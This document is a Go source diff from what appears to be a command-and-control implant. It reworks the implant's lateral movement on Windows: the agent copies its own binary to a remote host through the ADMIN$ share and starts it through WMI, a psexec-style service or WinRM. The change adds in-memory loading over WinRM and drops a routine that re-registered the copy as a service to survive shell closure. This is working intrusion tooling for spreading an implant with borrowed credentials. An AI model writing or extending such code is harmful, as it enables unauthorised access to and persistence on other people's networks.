@@ -55,23 +55,23 @@ func runLateralChild(args []string) error {
 	return nil
 }
 
-// lateralMove stages this agent binary on the target through the ADMIN$
-// share and starts it with the requested execution method. Every network
-// operation runs under the pinned worker's thread identity, which carries the
-// active make_token credentials when one is set; without a token the move
-// uses the agent's own identity and requires local admin rights on the
-// target. The staged copy needs embedded connection settings (base URL and
-// beacon secret) because a service process inherits no operator
-// environment; build it with the server's use_server_config option.
 func lateralMove(payload lateralPayload) (string, error) {
 	return lateralMoveWithProgress(payload, nil)
 }
 
-// lateralMoveWithProgress publishes acknowledged artifacts before waiting on SCM.
+// lateralMoveWithProgress transfers this agent using SMB for WMI, or WSMan
+// for WinRM, and starts it with the requested execution method. Every network
+// operation runs under the pinned worker's thread identity, which carries the
+// active make_token credentials when one is set; without a token the move
+// uses the agent's own identity and requires local admin rights on the
+// target. The WinRM method loads the streamed executable in memory inside
+// the receiver, so the deployment lives only as long as the WinRM shell.
+// All other methods need embedded connection settings (base URL and beacon
+// secret) because a service process inherits no operator environment; build
+// them with the server's use_server_config option.
 func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (string, error) {
-	self, err := os.Executable()
-	if err != nil {
-		return "", fmt.Errorf("resolve agent executable: %w", err)
+	if memoryHosted() {
+		return "", errMemoryHosted
 	}
 	parent := os.Getenv("RMM_SESSION_ID")
 	if parent == "" {
@@ -81,31 +81,41 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 	if targetSession == "" {
 		targetSession = derivedSessionID(parent, "lateral")
 	}
-	serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
-	if err != nil {
-		return "", err
-	}
-	localPath := `C:\Windows\System32\` + binaryName
-	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
 
 	if payload.Method == "psexec" {
+		serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
+		if err != nil {
+			return "", err
+		}
 		return lateralPsexecMove(payload, targetSession, serviceName, binaryName, publish)
-	}
-
-	// Stage the agent binary through ADMIN$ (SMB write under the active
-	// identity), before requesting remote execution.
-	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
-	if err := copyFile(self, sharePath); err != nil {
-		return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
 	}
 
 	switch payload.Method {
 	case "wmiexec":
+		// Only WMI uses SMB staging. WinRM transfers through its own session.
+		self, err := os.Executable()
+		if err != nil {
+			return "", fmt.Errorf("resolve agent executable: %w", err)
+		}
+		serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
+		if err != nil {
+			return "", err
+		}
+		sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
+		if err := copyFile(self, sharePath); err != nil {
+			return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
+		}
+		localPath := `C:\Windows\System32\` + binaryName
+		agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
 		if err := wmiCreateProcess(payload.Host, agentCommand); err != nil {
 			return "", err
 		}
 	case "winrm":
-		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName, payload.winrmIdentity, payload.HTTPS, payload.Insecure); err != nil {
+		self, err := os.Executable()
+		if err != nil {
+			return "", fmt.Errorf("resolve agent executable: %w", err)
+		}
+		if err := winrmDeployAgent(payload.Host, self, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure); err != nil {
 			return "", err
 		}
 	}
@@ -225,19 +235,6 @@ func waitStage1ServiceStopped(service uintptr, timeout time.Duration) error {
 		}
 		time.Sleep(100 * time.Millisecond)
 	}
-}
-
-// scmStartService creates and starts a service on the target host through
-// the native SCM API. When markForDeletion is set the entry is marked for
-// deletion immediately (removed once the process stops); the psexec module
-// leaves the entry in place so the cleanup command owns its removal.
-func scmStartService(host, serviceName, binPath string, markForDeletion bool) error {
-	handles, err := scmStartServiceRetained(host, serviceName, binPath, markForDeletion)
-	if err != nil {
-		return err
-	}
-	defer handles.close()
-	return handles.close()
 }
 
 // closeSCMHandle exposes native close failures to retained-handle cleanup.
@@ -381,26 +378,6 @@ func scmDeleteService(host, serviceName string) (bool, error) {
 	}
 	debugEvent("scm.delete_service.complete", nil)
 	return true, nil
-}
-
-// runLateralDetach re-registers this copy as a local Windows service and
-// exits. The WinRM shell terminates its command process tree when the shell
-// closes; the SCM-started instance runs outside that job object and
-// survives it. It runs under the identity WinRM authenticated on the target.
-func runLateralDetach(args []string) error {
-	startup, err := parseLateralStartup(args)
-	if err != nil {
-		return err
-	}
-	self, err := os.Executable()
-	if err != nil {
-		return fmt.Errorf("resolve agent executable: %w", err)
-	}
-	binPath := strings.Join(append([]string{self}, args...), " ")
-	if err := scmStartService("", startup.ServiceName, binPath, true); err != nil {
-		return fmt.Errorf("detach into the local service %s: %w", startup.ServiceName, err)
-	}
-	return nil
 }
 
 // runLateralCleanupChild is the --lateral-cleanup-child entry point: it
